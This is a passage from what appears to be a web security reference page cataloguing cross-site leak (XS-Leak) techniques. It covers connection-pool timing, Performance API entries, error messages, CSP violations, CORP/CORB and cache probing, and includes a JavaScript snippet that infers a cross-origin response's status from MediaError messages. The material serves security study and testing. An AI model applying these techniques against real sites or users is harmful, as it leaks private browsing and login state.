page’s socket). This inference is possible because the 255 sockets from step 2 are still engaged, implying that any newly available socket must be the one released from step 3. The time taken for the 256th socket to become available is thus directly linked to the time required for the request to the target page to complete.</li> </ol> <p>For more info: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</a></p> <h3 id="connection-pool-by-destination">Connection Pool by Destination</h3> <ul> <li> <strong>Inclusion Methods</strong>: JavaScript Requests</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>:</li> <li> <strong>Summary:</strong> It’s like the previous technique but instead of using all the sockets, Google <strong>Chrome</strong> puts a limit of <strong>6 concurrent request to the same origin</strong>. If we <strong>block 5</strong> and then <strong>launch a 6th</strong> request we can <strong>time</strong> it and if we managed to make the <strong>victim page send</strong> more <strong>requests</strong> to the same endpoint to detect a <strong>status</strong> of the <strong>page</strong>, the <strong>6th request</strong> will take <strong>longer</strong> and we can detect it.</li> </ul> <h2 id="performance-api-techniques">Performance API Techniques</h2> <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">Performance API</code></a> offers insights into the performance metrics of web applications, further enriched by the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">Resource Timing API</code></a>. The Resource Timing API enables the monitoring of detailed network request timings, such as the duration of the requests. Notably, when servers include the <code class="language-plaintext highlighter-rouge">Timing-Allow-Origin: *</code> header in their responses, additional data like the transfer size and domain lookup time becomes available.</p> <p>This wealth of data can be retrieved via methods like <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">performance.getEntries</code></a> or <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">performance.getEntriesByName</code></a>, providing a comprehensive view of performance-related information. Additionally, the API facilitates the measurement of execution times by calculating the difference between timestamps obtained from <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">performance.now()</code></a>. However, it’s worth noting that for certain operations in browsers like Chrome, the precision of <code class="language-plaintext highlighter-rouge">performance.now()</code> may be limited to milliseconds, which could affect the granularity of timing measurements.</p> <p>Beyond timing measurements, the Performance API can be leveraged for security-related insights. For instance, the presence or absence of pages in the <code class="language-plaintext highlighter-rouge">performance</code> object in Chrome can indicate the application of <code class="language-plaintext highlighter-rouge">X-Frame-Options</code>. Specifically, if a page is blocked from rendering in a frame due to <code class="language-plaintext highlighter-rouge">X-Frame-Options</code>, it will not be recorded in the <code class="language-plaintext highlighter-rouge">performance</code> object, providing a subtle clue about the page’s framing policies.</p> <h3 id="error-leak">Error Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> A request that results in errors will not create a resource timing entry.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20Error%20Leak</a> </li> </ul> <p>It is possible to <strong>differentiate between HTTP response status codes</strong> because requests that lead to an <strong>error</strong> do <strong>not create a performance entry</strong>.</p> <h3 id="style-reload-error">Style Reload Error</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Due to a browser bug, requests that result in errors are loaded twice.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak</a> </li> </ul> <p>In the previous technique it was also identified two cases where browser bugs in GC lead to <strong>resources being loaded twice when they fail to load</strong>. This will result in multiple entries in the Performance API and can thus be detected.</p> <h3 id="request-merging-error">Request Merging Error</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Requests that result in an error can not be merged.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak</a> </li> </ul> <p>The technique was found in a table in the mentioned paper but no description of the technique was found on it. However, you can find the source code checking for it in <a href="https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak</a></p> <h3 id="empty-page-leak">Empty Page Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Empty responses do not create resource timing entries.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak</a> </li> </ul> <p>An attacker can detect if a request resulted in an empty HTTP response body because e<strong>mpty pages do not create a performance entry in some browsers</strong>.</p> <h3 id="xss-auditor-leak"><strong>XSS-Auditor Leak</strong></h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Using the XSS Auditor in Security Assertions, attackers can detect specific webpage elements by observing alterations in responses when crafted payloads trigger the auditor’s filtering mechanism.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak</a> </li> </ul> <p>In Security Assertions (SA), the XSS Auditor, originally intended to prevent Cross-Site Scripting (XSS) attacks, can paradoxically be exploited to leak sensitive information. Although this built-in feature was removed from Google Chrome (GC), it’s still present in SA. In 2013, Braun and Heiderich demonstrated that the XSS Auditor could inadvertently block legitimate scripts, leading to false positives. Building on this, researchers developed techniques to extract information and detect specific content on cross-origin pages, a concept known as XS-Leaks, initially reported by Terada and elaborated by Heyes in a blog post. Although these techniques were specific to the XSS Auditor in GC, it was discovered that in SA, pages blocked by the XSS Auditor do not generate entries in the Performance API, revealing a method through which sensitive information might still be leaked.</p> <h3 id="x-frame-leak">X-Frame Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2), <a href="https://xsleaks.github.io/xsleaks/examples/x-frame/index.html" rel="external nofollow noopener" target="_blank">https://xsleaks.github.io/xsleaks/examples/x-frame/index.html</a>, <a href="https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options</a> </li> <li> <strong>Summary:</strong> Resource with X-Frame-Options header does not create resource timing entry.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak</a> </li> </ul> <p>If a page is <strong>not allowed</strong> to be <strong>rendered</strong> in an <strong>iframe</strong> it does <strong>not create a performance entry</strong>. As a result, an attacker can detect the response header <strong><code class="language-plaintext highlighter-rouge">X-Frame-Options</code></strong>.<br> Same happens if you use an <strong>embed</strong> <strong>tag.</strong></p> <h3 id="download-detection">Download Detection</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Downloads do not create resource timing entries in the Performance API.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20Download%20Detection" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20Download%20Detection</a> </li> </ul> <p>Similar, to the XS-Leak described, a <strong>resource that is downloaded</strong> because of the ContentDisposition header, also does <strong>not create a performance entry</strong>. This technique works in all major browsers.</p> <h3 id="redirect-start-leak">Redirect Start Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Redirect</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Resource timing entry leaks the start time of a redirect.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Redirect%20Start%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Redirect%20Start%20Leak</a> </li> </ul> <p>We found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However, in <strong>SA</strong> it is possible to detect if the user is <strong>redirected</strong> by the target page, by querying the <strong>Performance API</strong> and checking for the <strong>redirectStart timing data</strong>.</p> <h3 id="duration-redirect-leak">Duration Redirect Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Redirect</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> The duration of timing entries is negative when a redirect occurs.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Duration%20Redirect%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Duration%20Redirect%20Leak</a> </li> </ul> <p>In GC, the <strong>duration</strong> for requests that result in a <strong>redirect</strong> is <strong>negative</strong> and can thus be <strong>distinguished</strong> from requests that do not result in a redirect.</p> <h3 id="corp-leak">CORP Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.2)</li> <li> <strong>Summary:</strong> Resource protected with CORP do not create resource timing entries.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak</a> </li> </ul> <p>In some cases, the <strong>nextHopProtocol entry</strong> can be used as a leak technique. In GC, when the <strong>CORP header</strong> is set, the nextHopProtocol will be <strong>empty</strong>. Note that SA will not create a performance entry at all for CORP-enabled resources.</p> <h3 id="service-worker">Service Worker</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: API Usage</li> <li> <strong>More info</strong>: <a href="https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/" rel="external nofollow noopener" target="_blank">https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/</a> </li> <li> <strong>Summary:</strong> Detect if a service worker is registered for a specific origin.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>Service workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and <strong>cache resources</strong> to create offline web application.<br> If a <strong>resource cached</strong> by a <strong>service worker</strong> is accessed via <strong>iframe</strong>, the resource will be <strong>loaded from the service worker cache</strong>.<br> To detect if the resource was <strong>loaded from the service worker</strong> cache the <strong>Performance API</strong> can be used.<br> This could also be done with a Timing attack (check the paper for more info).</p> <h3 id="cache">Cache</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Timing</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources</a> </li> <li> <strong>Summary:</strong> It is possible to check if a resource was stored in the cache.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources</a>, <a href="https://xsinator.com/testing.html#Cache%20Leak%20(POST)" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Cache%20Leak%20(POST)</a> </li> </ul> <p>Using the <a href="xs-search.md#performance-api">Performance API</a> it’s possible to check if a resource is cached.</p> <h3 id="network-duration">Network Duration</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration</a> </li> <li> <strong>Summary:</strong> It is possible to retrieve the network duration of a request from the <code class="language-plaintext highlighter-rouge">performance</code> API.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration</a> </li> </ul> <h2 id="error-messages-technique">Error Messages Technique</h2> <h3 id="media-error">Media Error</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements (Video, Audio)</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=828265" rel="external nofollow noopener" target="_blank">https://bugs.chromium.org/p/chromium/issues/detail?id=828265</a> </li> <li> <strong>Summary:</strong> In Firefox is possible to accurately leak a cross-origin request’s status code.</li> <li> <strong>Code Example</strong>: <a href="https://jsbin.com/nejatopusi/1/edit?html,css,js,output" rel="external nofollow noopener" target="_blank">https://jsbin.com/nejatopusi/1/edit?html,css,js,output</a> </li> </ul> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Code saved here in case it dissapear from the link</span>
<span class="c1">// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="nx">startup</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="kd">function</span> <span class="nf">displayErrorMessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
  <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">log</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">startup</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">audioElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">audio</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";</span>
  <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">startTest</span><span class="dl">"</span><span class="p">).</span><span class="nf">addEventListener</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">,</span>
    <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">audioElement</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">testUrl</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="kc">false</span>
  <span class="p">);</span>
  <span class="c1">// Create the event handler</span>
  <span class="kd">var</span> <span class="nx">errHandler</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">err</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">error</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">status</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>

    <span class="c1">// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"</span>
    <span class="c1">// Firefox error.message when the request loads successfully: "Failed to init decoder"</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">message</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEMUXER_ERROR_COULD_NOT_OPEN</span><span class="dl">"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">message</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to init decoder</span><span class="dl">"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Success</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nf">displayErrorMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;strong&gt;Status: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">status</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/strong&gt; (Error code:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">code</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> / Error Message: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">)&lt;br&gt;</span><span class="dl">"</span><span class="p">);</span>
  <span class="p">};</span>
  <span class="nx">audioElement</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="nx">errHandler</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">MediaError</code> interface’s message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.</p> <h3 id="cors-error">CORS Error</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.3)</li> <li> <strong>Summary:</strong> In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected requests.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CORS%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CORS%20Error%20Leak</a> </li> </ul> <p>This technique enables an attacker to <strong>extract the destination of a cross-origin site’s redirect</strong> by exploiting how Webkit-based browsers handle CORS requests. Specifically, when a <strong>CORS-enabled request</strong> is sent to a target site that issues a redirect based on user state and the browser subsequently denies the request, the <strong>full URL of the redirect’s target</strong> is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also exposes the redirect’s endpoint and any <strong>sensitive query parameters</strong> it may contain.</p> <h3 id="sri-error">SRI Error</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.3)</li> <li> <strong>Summary:</strong> In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected requests.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#SRI%20Error%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#SRI%20Error%20Leak</a> </li> </ul> <p>An attacker can exploit <strong>verbose error messages</strong> to deduce the size of cross-origin responses. This is possible due to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched, often from CDNs, haven’t been tampered with. For SRI to work on cross-origin resources, these must be <strong>CORS-enabled</strong>; otherwise, they’re not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately <strong>trigger this error</strong> by assigning a <strong>bogus hash value</strong> to the integrity attribute of any request. In SA, the resulting error message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker to discern variations in response size, paving the way for sophisticated XS-Leak attacks.</p> <h3 id="csp-violationdetection">CSP Violation/Detection</h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=313737" rel="external nofollow noopener" target="_blank">https://bugs.chromium.org/p/chromium/issues/detail?id=313737</a>, <a href="https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html" rel="external nofollow noopener" target="_blank">https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html</a>, <a href="https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects</a> </li> <li> <strong>Summary:</strong> Allowing only the victims website in the CSP if we accessed it tries to redirect to a different domain the CSP will trigger a detectable error.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CSP%20Violation%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CSP%20Violation%20Leak</a>, <a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation" rel="external nofollow noopener" target="_blank">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation</a> </li> </ul> <p>A XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to <strong>allow the target domain on the attacker site</strong>. Once a request is issued to the target domain, it <strong>redirects</strong> to a cross-origin domain. <strong>CSP blocks</strong> the access to it and creates a <strong>violation report used as a leak technique</strong>. Depending on the browser, <strong>this report may leak the target location of the redirect</strong>.<br> Modern browsers won’t indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.</p> <h3 id="cache-1">Cache</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events</a>, <a href="https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html" rel="external nofollow noopener" target="_blank">https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html</a> </li> <li> <strong>Summary:</strong> Clear the file from the cache. Opens target page checks if the file is present in the cache.</li> <li><strong>Code Example:</strong></li> </ul> <p>Browsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has <strong>requested a specific file</strong>.</p> <p>If a page loads an image only if the user is logged in, you can <strong>invalidate</strong> the <strong>resource</strong> (so it’s no longer cached if it was, see more info links), <strong>perform a request</strong> that could load that resource and try to load the resource <strong>with a bad request</strong> (e.g. using an overlong referer header). If the resource load <strong>didn’t trigger any error</strong>, it’s because it was <strong>cached</strong>.</p> <h3 id="csp-directive">CSP Directive</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1105875" rel="external nofollow noopener" target="_blank">https://bugs.chromium.org/p/chromium/issues/detail?id=1105875</a> </li> <li> <strong>Summary:</strong> CSP header directives can be probed using the CSP iframe attribute, revealing policy details.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CSP%20Directive%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CSP%20Directive%20Leak</a> </li> </ul> <p>A novel feature in Google Chrome (GC) allows web pages to <strong>propose a Content Security Policy (CSP)</strong> by setting an attribute on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must <strong>authorize this via an HTTP header</strong>, or an <strong>error page is displayed</strong>. However, if the iframe is already governed by a CSP and the newly proposed policy isn’t more restrictive, the page will load normally. This mechanism opens a pathway for an attacker to <strong>detect specific CSP directives</strong> of a cross-origin page by identifying the error page. Although this vulnerability was marked as fixed, our findings reveal a <strong>new leak technique</strong> capable of detecting the error page, suggesting that the underlying problem was never fully addressed.</p> <h3 id="corp"><strong>CORP</strong></h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/browser-features/corp/" rel="external nofollow noopener" target="_blank"><strong>https://xsleaks.dev/docs/attacks/browser-features/corp/</strong></a> </li> <li> <strong>Summary:</strong> Resources secured with Cross-Origin Resource Policy (CORP) will throw an error when fetched from a disallowed origin.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CORP%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CORP%20Leak</a> </li> </ul> <p>The CORP header is a relatively new web platform security feature that when set b<strong>locks no-cors cross-origin requests to the given resource</strong>. The presence of the header can be detected, because a resource protected with CORP will <strong>throw an error when fetched</strong>.</p> <h3 id="corb">CORB</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Headers</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header</a> </li> <li> <strong>Summary</strong>: CORB can allow attackers to detect when the <strong><code class="language-plaintext highlighter-rouge">nosniff</code> header is present</strong> in the request.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CORB%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CORB%20Leak</a> </li> </ul> <p>Check the link for more information about the attack.</p> <h3 id="cors-error-on-origin-reflection-misconfiguration-">CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Headers</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration</a> </li> <li> <strong>Summary</strong>: If the Origin header is reflected in the header <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> it’s possible to check if a resource is in the cache already.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration</a> </li> </ul> <p>In case the <strong>Origin header</strong> is being <strong>reflected</strong> in the header <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> an attacker can abuse this behaviour to try to <strong>fetch</strong> the <strong>resource</strong> in <strong>CORS</strong> mode. If an <strong>error</strong> <strong>isn’t</strong> triggered, it means that it was <strong>correctly retrieved form the web</strong>, if an error is <strong>triggered</strong>, it’s because it was <strong>accessed from the cache</strong> (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)<strong>.</strong><br> Note that if the origin isn’t 